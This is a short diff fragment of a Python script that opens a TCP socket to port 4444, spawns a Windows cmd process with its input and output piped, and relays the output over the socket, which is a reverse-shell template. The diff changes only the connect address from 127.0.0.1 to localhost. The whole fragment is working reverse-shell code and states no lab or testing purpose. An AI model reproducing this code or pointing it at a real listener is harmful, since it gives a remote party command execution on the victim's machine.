@@ -14,7 +14,7 @@ def p2s(s, p):
         s.send(p.stdout.read(1))
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("127.0.0.1",4444))
+s.connect(("localhost",4444))
 
 p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
 
